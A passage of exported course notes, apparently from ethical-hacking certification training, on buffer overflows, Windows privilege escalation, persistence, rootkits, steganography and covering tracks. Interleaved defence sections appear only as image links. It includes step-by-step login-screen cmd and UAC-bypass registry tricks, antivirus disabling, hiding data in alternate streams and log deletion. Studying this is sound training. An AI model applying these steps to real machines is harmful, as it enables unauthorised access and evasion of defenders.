</p><h3 id="efaf37ad-d3ec-4c92-b1df-23070a076e5e" class="">Buffer Overflows</h3><ul id="6d09b5de-6fff-4374-b6c9-8086724c8d8d" class="bulleted-list"><li style="list-style-type:disc">explained what buffer overflow is</li></ul><ul id="0ea158ac-171e-4756-ac76-728613faac5a" class="bulleted-list"><li style="list-style-type:disc">Important registries: <ul id="2bdda80d-eca7-466c-b194-0d659a65e610" class="bulleted-list"><li style="list-style-type:circle">Base Pointer: bottom of stack</li></ul><ul id="ff2827cb-1d5a-456f-ace9-9ab636976cf6" class="bulleted-list"><li style="list-style-type:circle">Stack Pointer: top of stack</li></ul><ul id="bdbb965f-7b63-491a-9eb2-bc8142da8f41" class="bulleted-list"><li style="list-style-type:circle">Instruction pointer: current execution</li></ul></li></ul><p id="350e3b1c-620f-440d-b93c-f95d935ceaff" class="">
</p><ul id="b772715b-17c0-48a7-b8f8-9c033dd05490" class="bulleted-list"><li style="list-style-type:disc">Netcat alternative: cryptcat uses encrypted communication</li></ul><ul id="6fa2b517-6411-4414-9355-a445c0e53572" class="toggle"><li><details open=""><summary>Procedure to exploit BoF</summary><figure id="6746167b-69d7-412f-a118-ce40c7303842" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2014.png"><img style="width:461.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2014.png"/></a></figure></details></li></ul><p id="27943a04-d2d8-4809-ac42-47d4e6552978" class="">
</p><ol type="1" id="7a2a0e22-e43e-4dba-ab02-152e2cddfd6a" class="numbered-list" start="1"><li>Spiking: Get all commands that could be vulnerable and find which one crashes the app</li></ol><ol type="1" id="9201334e-e0bc-41e8-864c-101b3fead4cd" class="numbered-list" start="2"><li>Fuzzing: Find the amount of data that crashes the app</li></ol><ol type="1" id="23cdad43-7428-49a9-9f3e-523996a1a4ea" class="numbered-list" start="3"><li>Offset: find the exact amount of data it can handle before it crashes<ul id="a8fb6cfc-4219-4796-9d74-beeee909196d" class="bulleted-list"><li style="list-style-type:disc">create a pattern and find at what letter it starts to crash </li></ul><ul id="3a414732-df86-448c-8f58-cddf025f7f0f" class="bulleted-list"><li style="list-style-type:disc">so that we know the exact place it starts to crash</li></ul><ul id="e5c9297d-332f-429b-bbfe-47213b43726a" class="bulleted-list"><li style="list-style-type:disc">needs to run through the ImmunityDebugger to identify the byte that crashed it<ul id="91449b38-6e16-48cb-a20c-11a50ef735b6" class="bulleted-list"><li style="list-style-type:circle">We get the value of EIP (instruction pointer) that was before the crash</li></ul><ul id="d9c51473-2a82-413c-a5f7-3edb8c3a1b0f" class="bulleted-list"><li style="list-style-type:circle">So we convert it to character to find where it is</li></ul><ul id="7296cad9-1939-445c-896b-2438474bd8ae" class="bulleted-list"><li style="list-style-type:circle">If we overwrite the instruction in this location we will be able to control the code</li></ul></li></ul></li></ol><ol type="1" id="2873fd32-3933-4eb3-b579-c33a65312c96" class="numbered-list" start="4"><li>Overwrite EIP: overwrite the instruction in the found location<ul id="1d67d246-157e-4587-877e-d40f60b42874" class="bulleted-list"><li style="list-style-type:disc">put 4 D’s to see if they are in EIP when the app crashes</li></ul><ul id="257deb4d-f37e-4a6d-897d-16e671883211" class="bulleted-list"><li style="list-style-type:disc">we get 44444444 because D is 44 in hex so its correct</li></ul></li></ol><ol type="1" id="b04b2633-e58e-43ff-8d47-f74a015cc4e2" class="numbered-list" start="5"><li>Identify Bad Characters: code that crashes the app because it can’t be rendered by the OS<ul id="718577aa-3d54-4561-80ae-cd2f6a25e69d" class="bulleted-list"><li style="list-style-type:disc">test these characters in the location we found</li></ul><ul id="bc2035d1-18d4-4558-a217-78dda5eb9df8" class="bulleted-list"><li style="list-style-type:disc">to do it, just google or use the provided python script</li></ul></li></ol><ol type="1" id="fe0a38b4-14c1-4a69-ac3e-43bcf319552b" class="numbered-list" start="6"><li>Identify the right module: we need to find modules that don’t have memory protection<ul id="c2be9b9f-e20d-4e46-855a-06302f90e1a1" class="bulleted-list"><li style="list-style-type:disc">we need to start executing from a place without os denying us access to this memory</li></ul><ul id="09bd8d8a-19fa-4d90-8324-deb6b1ba8054" class="bulleted-list"><li style="list-style-type:disc">so we need to find where we can jump to esp execute the command we want</li></ul><ul id="26d5eac5-f813-4a53-85b4-7fe0a1a933d9" class="bulleted-list"><li style="list-style-type:disc">we use mona in immunity debugger, it shows a table with the enabled security measures for each memory location (we found a dll)</li></ul></li></ol><ol type="1" id="387b6784-f01c-4b3a-9e33-5a96f7b49b15" class="numbered-list" start="7"><li>Generate shellcode: create the jump and the payload<ul id="5cfea7bb-82c7-4cae-b882-a83035e3212f" class="bulleted-list"><li style="list-style-type:disc">use immunity debugger with mona again to find where the jump instructions are located in the dll we found</li></ul><ul id="651b1582-f65b-43cd-aeff-ce401df62754" class="bulleted-list"><li style="list-style-type:disc">so we find the address of this instruction and put it in reverse in our code because of the stack architecture (first in first out)</li></ul><ul id="fe344c09-0201-406c-97ec-b7ec65cfc9a1" class="bulleted-list"><li style="list-style-type:disc">we know thet EIP will have this address so it will start to execute what’s in this address</li></ul><ul id="db9a7a7f-b336-43b2-9147-d26bee57416a" class="bulleted-list"><li style="list-style-type:disc">added a break point at the jump instruction location to ensure we do go to this address</li></ul><ul id="dc874cd6-eddc-4ca9-a836-405503f1b91c" class="bulleted-list"><li style="list-style-type:disc">we don’t use the shellcode address directly to EIP because we don’t exactly know what that address is</li></ul><ul id="390b5bae-187b-42d8-a105-7627adbaf6f9" class="bulleted-list"><li style="list-style-type:disc">we chose a jump that jumps to esp so we know that it will jump at the start of the stack pointer and go downwards to the base pointer</li></ul><ul id="ba85dfd3-f928-4f5b-a7c0-8f719b839401" class="bulleted-list"><li style="list-style-type:disc">however we don’t know exactly where ESP will exist because it varies through execution so we play with nop sled lengths to find how much sliding will need to be done untill the payload is reached</li></ul><ul id="4c654857-7f04-4869-87ca-46a4f7d33f10" class="bulleted-list"><li style="list-style-type:disc">we add nops and then the shellcode because we have noise in the memory space, we know that somewhere between the shellcode and the nop the jump will land</li></ul></li></ol><ol type="1" id="ac3bc338-ec84-4187-84a7-d8c42a6506b2" class="numbered-list" start="8"><li>Gain access: run a listener for incoming connections<ul id="b8bcd3db-4c4d-4b74-8e69-cf55fd05018e" class="bulleted-list"><li style="list-style-type:disc">to see if the payload has run and the programme is still running</li></ul></li></ol><p id="5b623a4c-e397-45b4-ac84-f13efe917d1b" class="">
</p><ul id="96336932-7ff9-4b86-88ad-e2507debd3ff" class="bulleted-list"><li style="list-style-type:disc">Its a simple concept to understand but can be very difficult to execute</li></ul><ul id="b6dc0644-29b4-4147-9bb2-8789e8183264" class="bulleted-list"><li style="list-style-type:disc">Sometimes you can’t upload the shellcode, there is a technique where you find parts of the code to create it, called egg hunting<ul id="22ffc47f-8297-4955-acf7-2551cb10ce73" class="bulleted-list"><li style="list-style-type:circle">Corlean Seucrity <a href="http://corlean.be">corlean.be</a> has very good tutorials for advanced buffer oveflows with egg hunting and other techniques</li></ul></li></ul><p id="8c1bc46f-8a81-4b7f-b74e-568e77e983b5" class="">
</p><h3 id="c8420089-e1eb-4189-b4eb-9289377af279" class="">Other Methods</h3><ul id="ec74bc8f-4242-4b80-8624-afc95f691b94" class="bulleted-list"><li style="list-style-type:disc">Return Oriented Programming<ul id="50a8dea1-cf90-4450-9d61-82050c97ea33" class="bulleted-list"><li style="list-style-type:circle">when shellcode is too large</li></ul><ul id="be4990fd-ab4c-4ebd-bd0a-149addeb5d6d" class="bulleted-list"><li style="list-style-type:circle">reuses available libraries known as gadgets  to execute instructions</li></ul></li></ul><ul id="94459c9a-0a43-4ce3-a5a6-d8f112231359" class="bulleted-list"><li style="list-style-type:disc">Exploit Chaining<ul id="841e22a8-7c5f-43e8-92e2-e112bbc71ab4" class="bulleted-list"><li style="list-style-type:circle">load different exploits and payload depending on the case</li></ul></li></ul><ul id="425bef9b-5786-432c-80ac-5837f7d775d8" class="bulleted-list"><li style="list-style-type:disc">Active Directory Enumeration using PowerView<ul id="264e43dd-a892-4ae8-a7d9-4e29c8fafb68" class="bulleted-list"><li style="list-style-type:circle">most of the times ad is not properly configure</li></ul><ul id="f03191f2-3544-48c9-ac85-8d241ca5ead3" class="bulleted-list"><li style="list-style-type:circle">use powershellt o list information about the domain</li></ul><ul id="70b137a3-23a1-45dc-b476-115217cde2ec" class="bulleted-list"><li style="list-style-type:circle">but needs local access using PowerView if it exists</li></ul></li></ul><ul id="b9410bf1-d37f-406d-8c66-85bdf21b693d" class="bulleted-list"><li style="list-style-type:disc">Domain Mapping  and Exploitation with Bloodhound<ul id="68711c7d-f2a1-438c-b138-53b3d59c4078" class="bulleted-list"><li style="list-style-type:circle">an alternate way to exploit</li></ul><ul id="51a451a7-82a9-4791-9078-5ba828dedec9" class="bulleted-list"><li style="list-style-type:circle">uses graphical overview for automatic enumeration of the active directory to find relationships easier</li></ul></li></ul><ul id="6942685c-bc59-41cf-9ffc-4aff193c4f2e" class="bulleted-list"><li style="list-style-type:disc">Identofy insecurities using GhostPack Seatbelt</li></ul><ul id="f0704de0-5f80-4824-8759-51842557a869" class="bulleted-list"><li style="list-style-type:disc">Buffer Overflow Detection Tools<ul id="3b9f2b8f-1bbb-4651-af72-f5ad4165fc6c" class="bulleted-list"><li style="list-style-type:circle">vercode, flawfinder, kiuwan, splint, bovstt</li></ul></li></ul><p id="764e46ea-8e9b-43b5-88f0-5c650246e899" class="">
</p><p id="75113d90-d617-4a06-ba0e-5c031e7a4d51" class="">
</p><p id="8b27e660-b8ac-4a77-b097-c56a5d685d0c" class=""><strong>Useful Info:</strong> Microsoft used to update per vulnerability and hackers would see the difference and identify the vulnerability before the update, to cope that they produce updates that patch multiple vulnerabilities</p><p id="e573675b-df4c-4460-a9c2-b424e0c60308" class="">
</p><h3 id="12f46e2d-86bb-4fa0-bb2a-048289d2a086" class="">Defending against Buffer Overflows</h3><figure id="a3263a11-f86e-4c9b-be48-0c68725fa724" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2015.png"><img style="width:489.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2015.png"/></a></figure><p id="a3eb3223-1617-4ed2-afd3-3a6c852aa509" class="">
</p><h3 id="74d4648d-245a-4d52-a925-b8a38f7540a1" class="">Privilege Escalation Techniques</h3><ul id="b1fdb2c2-6c1d-49dc-abc6-999d07bbc8c3" class="bulleted-list"><li style="list-style-type:disc">Horizontal: gain another user access</li></ul><ul id="cc4a89b7-64eb-4d9e-a2fc-d9eee2429452" class="bulleted-list"><li style="list-style-type:disc">Vertical: gain higher privileges from specific user</li></ul><p id="a720c7ee-9144-4ce0-a423-16d7d9f745c0" class="">
</p><ul id="47fb97bb-9b93-437d-8ad1-888fb4fc054b" class="bulleted-list"><li style="list-style-type:disc">Using dll hijacking<ul id="7afba1a2-b41a-4c8d-84d3-b3e9f3ca9e86" class="bulleted-list"><li style="list-style-type:circle">Dlls are executables just like exe</li></ul><ul id="1354adb7-eaec-45bb-af32-9f1e0b561677" class="bulleted-list"><li style="list-style-type:circle">if you inject them in an executable that runs with root privilages, then you have root privilages</li></ul><ul id="f613e8dd-51f7-4dd2-8f60-9f7fe7bbe797" class="bulleted-list"><li style="list-style-type:circle">x64dbg has a disassembler that can reconstruct binary code from dll to human readable code <ul id="969c5efe-148e-403b-bafa-37fcbc53670c" class="bulleted-list"><li style="list-style-type:square">You can change what a function does in actual code and compile it back</li></ul><ul id="21e03e19-10ba-4d8b-b2ab-67bd9014605b" class="bulleted-list"><li style="list-style-type:square">but if the parent process checks the integrity of the dll then it will not be loaded</li></ul></li></ul><ul id="b0852d4d-9831-43b3-84d4-c2c2349b47f9" class="bulleted-list"><li style="list-style-type:circle">logic bomb planting</li></ul></li></ul><ul id="4f0369fd-c073-4562-b84c-bd73c68001ce" class="bulleted-list"><li style="list-style-type:disc">Exploiting Vulnerabilities<ul id="265eab3c-d02c-425e-aa47-b479640eca14" class="bulleted-list"><li style="list-style-type:circle">find privesc exploits on exploitdb</li></ul></li></ul><ul id="6780acbb-1fcd-4593-b91b-87ea681274b0" class="bulleted-list"><li style="list-style-type:disc">Dylib Jijacking<ul id="38dff96f-4ae8-4285-aaa1-0af6f1f2ca9b" class="bulleted-list"><li style="list-style-type:circle">same as dll hijacking but in MacOs</li></ul></li></ul><ul id="44e994ed-163c-417e-8d4a-cee07ddb8fcc" class="bulleted-list"><li style="list-style-type:disc">Use Meltdown and Spectre<ul id="d9c982fc-1ff6-48e8-8785-4f283c81d2de" class="bulleted-list"><li style="list-style-type:circle">they can be exploited just by having a remote service running</li></ul></li></ul><ul id="52352bc5-bd59-49af-8541-814b320fdc9a" class="bulleted-list"><li style="list-style-type:disc">Naame Pipe Impersonation</li></ul><ul id="794da7c1-3a49-489a-a77f-4f655e16ccaf" class="bulleted-list"><li style="list-style-type:disc">Misconfigured Services<ul id="1d94d16b-a9b4-4571-bf9c-1f9470953743" class="bulleted-list"><li style="list-style-type:circle">Unattended installs - configuration files that have hardcoded credentials</li></ul></li></ul><ul id="91fc65de-ba7c-410b-b8e6-208e98c57253" class="bulleted-list"><li style="list-style-type:disc">Pivoting and Relaying to Hack External Machines<ul id="54045630-0deb-4fc7-8748-f38a19938157" class="bulleted-list"><li style="list-style-type:circle">you can use hack machines to hack other machines so that you are not found</li></ul><ul id="afbeb576-65a7-40eb-89a7-1e8027beb5fe" class="bulleted-list"><li style="list-style-type:circle">you do them in the name of the victim</li></ul><ul id="19b5ae2d-4416-4833-ba80-44f0541a9234" class="bulleted-list"><li style="list-style-type:circle">has instructions through the meterpreter</li></ul></li></ul><ul id="7cb8cabf-5402-4c6d-91a4-e98c08aaea85" class="bulleted-list"><li style="list-style-type:disc">Misconfigured NFS</li></ul><ul id="2a86c7e7-01a0-4bee-9937-cd316f86d28b" class="bulleted-list"><li style="list-style-type:disc">Using Windows Sticky Keys<ul id="fe1b0300-b469-4050-a5f4-403b54ae18fe" class="bulleted-list"><li style="list-style-type:circle">hold shift 5 times opens sticky keys</li></ul><ul id="4a6aea6a-8d38-4f4b-a90b-ebe6ba720c1b" class="bulleted-list"><li style="list-style-type:circle">overwrite a binary file that opens the sticky keys, to open sth else like cmd</li></ul></li></ul><ul id="4531694f-db56-41af-8b7a-0e7b79e78749" class="bulleted-list"><li style="list-style-type:disc">Gain administrator with cmd from login screen<ul id="7dcee2a4-d6c7-4dfc-9ad3-e65c068464f6" class="bulleted-list"><li style="list-style-type:circle">this tutorial is on his blogspot piperevski.blogspot.com</li></ul><ul id="cb115894-7427-476a-951f-4dd11f1d8eb9" class="bulleted-list"><li style="list-style-type:circle">Boot another Iso and open repair → command prompt</li></ul><ul id="122041cc-979a-4100-a68b-15917f00d29b" class="bulleted-list"><li style="list-style-type:circle">open regedit → HKEY_LOCAL_MACHINE</li></ul><ul id="a14d6496-f7a6-423b-aa5f-b31443f7eadf" class="bulleted-list"><li style="list-style-type:circle">load hive → load registries of the installed os and modify them</li></ul><ul id="c9a63c57-7e84-4bc5-8b3f-b650f5dde98b" class="bulleted-list"><li style="list-style-type:circle">sys32/config/software </li></ul><ul id="41b414e0-1265-4a01-b6d1-9b10b9b7f912" class="bulleted-list"><li style="list-style-type:circle">microsoft/window nt/currentversion/image file execution options</li></ul><ul id="b667aa87-247f-4839-896e-bf7619fdd299" class="bulleted-list"><li style="list-style-type:circle">create a folder names utilman.exe and create a Debugger that runs cmd.exe</li></ul><ul id="e8ab1985-cf33-4c85-9dcc-62898ec672e6" class="bulleted-list"><li style="list-style-type:circle">the ease of access in the login screen will give you a cmd when clicked</li></ul><ul id="e830cb58-c92d-4f2d-9cb4-da8a76ecc461" class="bulleted-list"><li style="list-style-type:circle">registry deleted by windows defender on latest updates</li></ul><ul id="e68c8270-920a-4ec1-a3bd-99ee6dd4e1d2" class="bulleted-list"><li style="list-style-type:circle">but you can execute a batch file that runs any commands before the antivirus recognises it</li></ul></li></ul><ul id="743584bf-f7b7-4b6d-b269-01de33c86b6e" class="bulleted-list"><li style="list-style-type:disc">Sysinternals Suite Tools for Fileless escalation<ul id="4805699c-377d-4417-8fd3-def54713f987" class="bulleted-list"><li style="list-style-type:circle">sdclt.exe file in system32 is the microsoft backup and restore file</li></ul><ul id="036ac8aa-f75d-49ff-883e-1cb8f9cde622" class="bulleted-list"><li style="list-style-type:circle">works on sdclt.exe 6.1.76</li></ul><ul id="68b1cb76-dd10-4859-839f-5351e5889f4a" class="bulleted-list"><li style="list-style-type:circle">this vulnerability is patched, but you can download an older version of this file to exploit this vuln (get it from older iso)</li></ul><ul id="ccf460be-1d43-46ea-a381-06ad50537658" class="bulleted-list"><li style="list-style-type:circle">it is signed with a digital signature of microsoft so we can bypass access controls</li></ul><ul id="dff5503f-61d6-4263-9fc9-6d4b5332a70f" class="bulleted-list"><li style="list-style-type:circle">we can run sdclt.exe, alot of commands are executed in the background </li></ul><ul id="fcfb278a-fba3-4329-aebb-c34f9b70371d" class="bulleted-list"><li style="list-style-type:circle">we can identify the process using the sysinternals process monitor</li></ul><ul id="811a86ee-cedb-41ae-b446-5a613cf81ad4" class="bulleted-list"><li style="list-style-type:circle">it shows all the events executed in the flow</li></ul><ul id="482bc533-1ab7-4006-8b22-adf001ea4b98" class="bulleted-list"><li style="list-style-type:circle">some registries are not found</li></ul><ul id="bdfe6a18-e2fd-46c2-9be5-39fc53518dda" class="bulleted-list"><li style="list-style-type:circle">HKCU registries can be edited by current user aneksartitws perivilages</li></ul><ul id="4e965241-571f-48cb-a194-df088142f5da" class="bulleted-list"><li style="list-style-type:circle">we find such registry, the exploitable one is microsoft/windows/currentversion/app paths/control.exe</li></ul><ul id="dd828bcf-df96-4b17-9240-32652f2c0bed" class="bulleted-list"><li style="list-style-type:circle">go to regedit and create a key of this non existing registry and on the default REG_SZ with the path cmd.exe</li></ul><ul id="f48345a8-04f4-438e-98be-452ab485db3c" class="bulleted-list"><li style="list-style-type:circle">this way we gain admin access</li></ul></li></ul><ul id="37d9970d-b6b3-4ac5-85d1-e544bc97468e" class="bulleted-list"><li style="list-style-type:disc">Bypassing User Account Control using metasploit and memory injection</li></ul><ul id="2befe03b-8def-47b6-a2a5-a8f046015894" class="bulleted-list"><li style="list-style-type:disc">Abusing Boot or Logon Initialization Scripts</li></ul><ul id="1d5e7d95-240c-4131-8896-ac5380055855" class="bulleted-list"><li style="list-style-type:disc">Modifying Domain Policy</li></ul><ul id="d8d3ff51-3103-406d-9f3c-8bb18dbced55" class="bulleted-list"><li style="list-style-type:disc">Retrieving Password Hashes of Other Domain Controllers using DCSync Attack<ul id="ec2bd1dc-ff53-4443-bf5f-8aea39210aba" class="bulleted-list"><li style="list-style-type:circle">mimikatz is in the exam multiple times</li></ul></li></ul><ul id="d3b2b094-2731-45d7-8386-b01a00f618d2" class="bulleted-list"><li style="list-style-type:disc">Delete the files of an antivirus (copy to some other folder and load them back)<ul id="e79733cc-5786-4764-ae31-8ec05bf72f13" class="bulleted-list"><li style="list-style-type:circle">boot system again normally privesc, then copy back</li></ul></li></ul><ul id="3c8b657b-2c55-4f34-a742-a5155c399ba9" class="bulleted-list"><li style="list-style-type:disc">Disable Defender<ul id="91057917-3205-4a55-adbe-e28a70846ab2" class="bulleted-list"><li style="list-style-type:circle">registry tweaks, like making convinved like there is another antivirus so it disables</li></ul><ul id="e1bcfe1c-10c6-4c68-8279-6f23fca9be24" class="bulleted-list"><li style="list-style-type:circle">exploit guard, ramsomware protection, are built in security measures different than defender</li></ul></li></ul><p id="b1e49d78-a20b-4a57-be90-8c16f89e4d3a" class="">
</p><h3 id="6286e415-238d-46a9-8c6d-bb27310ba281" class="">Defend Against Privilage Escalation</h3><figure id="092d467a-80e2-4d82-8f8c-3192ddc28806" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2016.png"><img style="width:489.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2016.png"/></a></figure><figure id="6571bc8e-6c43-4965-bc5d-9091dc2788d2" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2017.png"><img style="width:489.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2017.png"/></a></figure><h3 id="18f1dbff-10f1-4bae-ab6f-23f544ab1b54" class="">Techniques to Hide Malicious Programs and Maintain Access</h3><ul id="40b878b6-420f-40b9-b65e-7413dc45f0ee" class="bulleted-list"><li style="list-style-type:disc">Executing Apps for remote control<ul id="75f8a429-e545-4d16-905c-2b625626b169" class="bulleted-list"><li style="list-style-type:circle">ninja, pupy, pdq deploy, managenegine destop central, psexec</li></ul></li></ul><ul id="679c845f-758f-4911-aa51-365eb2bce3ef" class="bulleted-list"><li style="list-style-type:disc">Keyloggers<ul id="c6cdd999-d826-4c9f-a428-a05a8947299c" class="bulleted-list"><li style="list-style-type:circle">hardware, software</li></ul></li></ul><ul id="a4f1cc99-942f-4f80-ae75-87633d161530" class="bulleted-list"><li style="list-style-type:disc">Spyware<ul id="595be723-9be5-4ba0-8473-5e217507931a" class="bulleted-list"><li style="list-style-type:circle">they can be legitimate products</li></ul><ul id="0a523758-dd0f-4336-bdfe-fe3141a0c62a" class="bulleted-list"><li style="list-style-type:circle">ekran system - user activity monitoring, completely monitoring remotely </li></ul><ul id="b672f1de-7bb4-46ec-bd96-1c57d3782d74" class="bulleted-list"><li style="list-style-type:circle"><a href="http://keelog.com">keelog.com</a> has hardware keyloggers and hardware video recorders</li></ul><ul id="424b7209-2c72-49b7-9f97-39a06dc28f9f" class="toggle"><li><details open=""><summary>Defend against spyware</summary><ul id="6c83625e-ec44-4c8f-a21c-b84c4f42edf7" class="bulleted-list"><li style="list-style-type:disc">process explorer → verify image signature</li></ul><figure id="196f32a4-2780-4e60-9382-ac21b5fba8ab" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2018.png"><img style="width:614.9573364257812px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2018.png"/></a></figure></details></li></ul></li></ul><ul id="7fbe9f08-0b79-4dc0-aa99-aa08667d298d" class="bulleted-list"><li style="list-style-type:disc">Rootkits<ul id="f3119a77-64c5-48f0-bab3-5799eb5a0799" class="bulleted-list"><li style="list-style-type:circle">their objective is to hide</li></ul><ul id="f0502670-b892-4ae6-a7ef-f417fe627718" class="bulleted-list"><li style="list-style-type:circle">adds hooks to manipulate a Direct Kernel Object </li></ul><ul id="5e19125f-4438-4f7f-a8b0-bcc833288595" class="bulleted-list"><li style="list-style-type:circle">hackerdefender rootkit tutorials github - school example, wont work on win 11</li></ul><ul id="e074de17-1efc-4b31-9ece-c2faef5fe336" class="toggle"><li><details open=""><summary>Detecting Rootkits</summary><figure id="b810fdd5-d50f-46db-8cd7-fd914ac2f7fa" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2019.png"><img style="width:585.95166015625px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2019.png"/></a></figure></details></li></ul></li></ul><ul id="2e781293-5613-4340-922d-b82657eddb82" class="bulleted-list"><li style="list-style-type:disc">NTFS Data Streams<ul id="0c50bdda-0d62-411a-a527-bb57a84ac9ca" class="bulleted-list"><li style="list-style-type:circle">use alternate data streams, this cant be disabled in windows</li></ul><ul id="7863441e-fca0-4738-919d-325d6bc15594" class="bulleted-list"><li style="list-style-type:circle">they hide the data inside the empty space of the file system</li></ul><ul id="74a4a922-9285-4b93-98b6-6bf29572bef8" class="bulleted-list"><li style="list-style-type:circle">its a link you can put on an existing file that links to empty space of the file system</li></ul><ul id="64b72388-0872-420f-9784-05ae07baa69e" class="bulleted-list"><li style="list-style-type:circle">notepad visible.txt:hidden.txt</li></ul><ul id="592f126e-907c-4f04-95a9-39772949a738" class="bulleted-list"><li style="list-style-type:circle">the visible is the same size but does not reveal anything</li></ul><ul id="01d0a9d9-84bf-4f4f-baf2-d49b83dd56bd" class="bulleted-list"><li style="list-style-type:circle">dir /R shows hidden files</li></ul><ul id="d939e34a-af2b-40aa-890a-6af8570145d8" class="bulleted-list"><li style="list-style-type:circle">antiviruses are able to scan and find these</li></ul><ul id="5f488e34-0336-4043-888a-071b61d78a0e" class="bulleted-list"><li style="list-style-type:circle">if you copy to fat32 the hidden files are lost but its good if you are caught because the data is lost and they wont catch you</li></ul><ul id="aaf010b0-92b8-4be9-9e78-44a61d462b89" class="toggle"><li><details open=""><summary>Defend against NTFS Alternate Data Streams</summary><figure id="6c5b23a0-b2aa-458b-8bbe-321fe96834d7" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2020.png"><img style="width:583.9630737304688px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2020.png"/></a></figure></details></li></ul></li></ul><ul id="def005b1-5bc1-4bfa-b203-4b924ab26ae2" class="bulleted-list"><li style="list-style-type:disc">Steganography<ul id="e6506da6-9940-4e66-b42f-f52de07e9a09" class="bulleted-list"><li style="list-style-type:circle">hide secret message inside other things like video, source code, images, audio, cipher etc</li></ul><ul id="fea8f446-254f-4142-995d-92d8362a2a57" class="toggle"><li><details open=""><summary>Types</summary><figure id="e75fe8d7-3b35-4629-ae99-0455b9001f7c" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2021.png"><img style="width:479.9715881347656px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2021.png"/></a></figure></details></li></ul><ul id="e7199714-86eb-403d-9a92-6279b3924799" class="bulleted-list"><li style="list-style-type:circle">Tools: OpenStego, StegoStick - they are in the exam</li></ul><ul id="cc46bce9-bd1e-47ac-b2e2-738da508eb7a" class="bulleted-list"><li style="list-style-type:circle">Steganalysis - to discover steganopgraphy</li></ul><ul id="4b5a9a51-97ac-42e1-9916-ec8dd8709b7b" class="toggle"><li><details open=""><summary>Steganalysis Methods/Attacks on Steganography (<strong>on exam)</strong></summary><figure id="63467bd3-c520-4d59-8089-b7e19e5abe78" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2022.png"><img style="width:590.95166015625px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2022.png"/></a></figure></details></li></ul><ul id="e36539c4-b58f-447a-bac4-d59906d4aaa9" class="bulleted-list"><li style="list-style-type:circle">LSB Insertion Method<ul id="e358c396-1d9d-4d37-9610-8130c854dfeb" class="bulleted-list"><li style="list-style-type:square">change the lsb of the color of the image</li></ul><ul id="468166a7-b041-4b1c-a759-25c7b09a0f8a" class="bulleted-list"><li style="list-style-type:square">wont affect the image because colors are almost identical</li></ul><ul id="5de8edb6-b289-40e0-ac7c-875bf7332ca7" class="bulleted-list"><li style="list-style-type:square">you can extract/hide the information like this</li></ul></li></ul><ul id="ba28849e-bfd2-48e0-8a36-f0d142e6f3ab" class="bulleted-list"><li style="list-style-type:circle">Tools To Detect<ul id="ae0b2350-4779-4f85-a91c-f939f4192029" class="bulleted-list"><li style="list-style-type:square">stegoveritas, stegextract, stegohunt, steganography studio, virtual steganographic library</li></ul></li></ul></li></ul><ul id="81b307aa-cba8-4b14-a935-722dc74896c1" class="bulleted-list"><li style="list-style-type:disc">Maintaining Persistance using Abusing Boot or Autostart</li></ul><ul id="aeed9b78-6e7c-4445-bc8e-854eb3005686" class="bulleted-list"><li style="list-style-type:disc">Remote Code Execution abusing DPAPI</li></ul><ul id="2328a86a-6352-4076-bc65-6e9cc431a22f" class="bulleted-list"><li style="list-style-type:disc">Golden/Silver Ticket Attack</li></ul><ul id="4bc4f923-2d26-4328-8321-460a5cfcfdab" class="bulleted-list"><li style="list-style-type:disc">Overpass-the-Hash Attack</li></ul><h3 id="ca16f8c5-9e16-4bf4-aa1a-48ced0941889" class="">Clearing Tracks or Hiding Information</h3><ul id="8177746f-7437-4d63-b5c3-ed8fda2db8d3" class="bulleted-list"><li style="list-style-type:disc">deleting logs</li></ul><ul id="dfc0fbb4-604b-4945-aa37-4b5f61774fd3" class="bulleted-list"><li style="list-style-type:disc">use auditpol to disable auditing</li></ul><ul id="99eaf665-63ea-4f12-84be-59a707b2848d" class="bulleted-list"><li style="list-style-type:disc">delete cookies, cache, turn of autocomplete</li></ul><ul id="940a8eaa-8bff-4036-81c4-1e6f9096cff5" class="bulleted-list"><li style="list-style-type:disc">delete bash history </li></ul><ul id="a3d9710b-5cfa-4a6d-bfae-6af81d4ad699" class="bulleted-list"><li style="list-style-type:disc">on the network<ul id="8e319c2b-af12-4eb3-bf96-d7892b25f813" class="bulleted-list"><li style="list-style-type:circle">use reverse http shells</li></ul><ul id="27813330-bf69-4c97-b537-7d3b677974f6" class="bulleted-list"><li style="list-style-type:circle">use reverce icmp tunnels</li></ul><ul 